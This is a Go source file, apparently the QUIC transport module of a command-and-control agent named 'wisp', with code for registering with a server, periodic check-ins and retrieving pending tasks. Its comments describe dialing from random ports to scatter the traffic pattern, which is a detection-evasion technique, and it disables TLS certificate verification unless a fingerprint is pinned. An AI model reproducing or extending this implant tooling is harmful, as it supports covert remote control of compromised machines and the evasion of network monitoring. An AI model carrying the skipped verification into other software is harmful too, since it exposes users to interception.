package transport

// QUICTransport communicates with the server over QUIC/UDP — TLS 1.3 plus the
// reliability and low-latency of a modern multiplexed transport. It implements
// the same Transport interface as TCP/KCP (identical packet-level handshake and
// polling); only the dial layer differs.
//
// Like the other transports it uses short-lived sessions: every register/checkin
// dials a fresh QUIC connection from a random ephemeral UDP port and closes it
// right after, keeping the source-port/4-tuple pattern scattered. The QUIC
// handshake provides reliable delivery of the reply (unlike raw KCP, data is
// not dropped by Close), so no extra drain delay is needed on the client side.
//
// QUIC's TLS layer uses the server's self-signed certificate. The application
// layer already encrypts every payload with the RSA+AES hybrid scheme, so the
// TLS trust anchor is skipped unless a fingerprint is pinned at build time.

import (
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"time"

	"github.com/quic-go/quic-go"

	"github.com/user/wisp/shared/protocol"
)

// quicNextProto is the ALPN token used by the server listener.
const quicNextProto = "wisp"

// QUICTransport manages QUIC/UDP communication with the server.
type QUICTransport struct {
	Host      string
	Port      int
	AgentID   string
	Keys      *protocol.SessionKeys
	RSAPubPEM string

	// Fingerprint optionally pins the server TLS certificate (hex SHA-256).
	Fingerprint string

	seq uint64 // monotonic checkin counter (replay protection)
}

// NewQUICTransport creates a QUIC transport for the given server endpoint.
func NewQUICTransport(host string, port int, agentID, rsapubPEM, fingerprint string) *QUICTransport {
	return &QUICTransport{Host: host, Port: port, AgentID: agentID, RSAPubPEM: rsapubPEM, Fingerprint: fingerprint}
}

// fetchServerKey requests the RSA public key from the server (CLI/dev mode).
func (t *QUICTransport) fetchServerKey() error {
	conn, err := t.dial()
	if err != nil {
		return err
	}
	defer conn.Close()
	key, err := fetchKeyOnConn(conn)
	if err != nil {
		return err
	}
	t.RSAPubPEM = key
	return nil
}

// Register performs the initial agent registration with the server.
func (t *QUICTransport) Register(regData []byte) error {
	if t.RSAPubPEM == "" {
		if err := t.fetchServerKey(); err != nil {
			return fmt.Errorf("fetch server key: %w", err)
		}
	}

	conn, err := t.dial()
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}
	defer conn.Close()

	keys, err := registerOnConn(conn, t.RSAPubPEM, regData)
	if err != nil {
		return err
	}
	t.Keys = keys
	return nil
}

// Checkin sends a heartbeat and retrieves pending tasks over a fresh short-lived
// QUIC connection. Any failure maps to ErrReauth so the caller re-registers.
func (t *QUICTransport) Checkin(results []byte) ([]byte, error) {
	conn, err := t.dial()
	if err != nil {
		return nil, ErrReauth
	}
	defer conn.Close()

	data, err := checkinOnConn(conn, t.AgentID, &t.seq, t.Keys, results)
	if err != nil {
		return nil, ErrReauth
	}
	return data, nil
}

// dial opens a fresh QUIC connection and one stream on it, wrapped as a
// net.Conn. The TLS layer trusts the pinned fingerprint when available, and
// skips verification otherwise (the application layer already encrypts).
func (t *QUICTransport) dial() (net.Conn, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// The server uses a self-signed certificate, so the chain check must stay
	// disabled. When a fingerprint is pinned, verify it as an additional
	// callback — exactly like the TCP TLS transport.
	tlsConfig := &tls.Config{
		NextProtos:         []string{quicNextProto},
		InsecureSkipVerify: true,
	}
	if t.Fingerprint != "" {
		tlsConfig.VerifyPeerCertificate = fingerprintVerifier(t.Fingerprint)
	}

	conn, err := quic.DialAddr(ctx, net.JoinHostPort(t.Host, fmt.Sprintf("%d", t.Port)), tlsConfig, nil)
	if err != nil {
		return nil, fmt.Errorf("quic dial: %w", err)
	}

	stream, err := conn.OpenStreamSync(ctx)
	if err != nil {
		_ = conn.CloseWithError(0, "no stream")
		return nil, fmt.Errorf("quic open stream: %w", err)
	}

	return &quicStreamAdapter{conn: conn, stream: stream}, nil
}

// quicStreamAdapter adapts a QUIC connection + one stream into a net.Conn so
// the shared packet protocol runs over it unchanged.
// quic-go v0.61 exposes Stream as an interface and AcceptStream/OpenStreamSync
// return *quic.Stream (a pointer to that interface).
type quicStreamAdapter struct {
	conn   *quic.Conn
	stream *quic.Stream
}

func (a *quicStreamAdapter) Read(p []byte) (int, error)         { return a.stream.Read(p) }
func (a *quicStreamAdapter) Write(p []byte) (int, error)        { return a.stream.Write(p) }
func (a *quicStreamAdapter) Close() error {
	// This side has already received its reply before Close is called (the
	// caller returns only after a successful Read), so tearing the connection
	// down immediately does not lose anything it still needs.
	_ = a.stream.Close()
	return a.conn.CloseWithError(0, "done")
}
func (a *quicStreamAdapter) LocalAddr() net.Addr                { return a.conn.LocalAddr() }
func (a *quicStreamAdapter) RemoteAddr() net.Addr               { return a.conn.RemoteAddr() }
func (a *quicStreamAdapter) SetDeadline(t time.Time) error      { return a.stream.SetDeadline(t) }
func (a *quicStreamAdapter) SetReadDeadline(t time.Time) error  { return a.stream.SetReadDeadline(t) }
func (a *quicStreamAdapter) SetWriteDeadline(t time.Time) error { return a.stream.SetWriteDeadline(t) }
